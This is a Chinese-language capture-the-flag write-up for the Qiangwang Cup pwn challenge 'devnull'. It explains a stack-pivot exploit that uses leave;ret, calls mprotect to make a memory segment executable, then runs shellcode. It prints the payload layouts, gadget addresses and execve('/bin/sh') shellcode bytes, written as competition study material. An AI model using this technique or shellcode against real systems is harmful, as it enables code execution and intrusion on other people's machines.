# devnull

> 分类：Pwn（强网先锋）

## 题目描述

通过劫持 rbp 和栈迁移控制程序执行流，用 mprotect 赋予段执行权限后执行 shellcode。

## 考察知识点

- 栈迁移（leave; ret）
- mprotect 修改内存权限
- shellcode 执行

## 解法

1. 第一处输入 `payload = 'e'*0x34 + p64(addr-8)*2 + p64(leave_ret)`，控制 rbp=rsp=addr-8，buf=addr-8。
2. 第二处输入布置栈：`p64(addr) + p64(pop_rbp_ret) + p64(addr+0x10) + p64(mov_eax) + p64(0x4012D0) + p64(0xdeadbeef) + p64(0x3ff030) + shellcode`。
3. 用 mprotect 赋予 `0x3ff000` 段执行权限，跳转执行 shellcode 拿 shell 读取 flag。

```python
leave_ret = 0x401511
addr = 0x3ff000
mov_eax = 0x401351  # mov eax, [rbp-0x18]; leave; ret
pop_rbp_ret = 0x40129d
shellcode = b"\x48\x31\xC0\x6A\x3B\x58\x48\x31\xFF\x48\xBF\x2F\x62\x69\x6E\x2F\x73\x68\x00\x57\x54\x5F\x48\x31\xF6\x48\x31\xD2\x0F\x05"
```

## 参考答案

（flag 通过 shellcode getshell 读取）

## 来源

- 作者：404Team | https://www.nynusec.com/archives/第六届强网杯-writeup
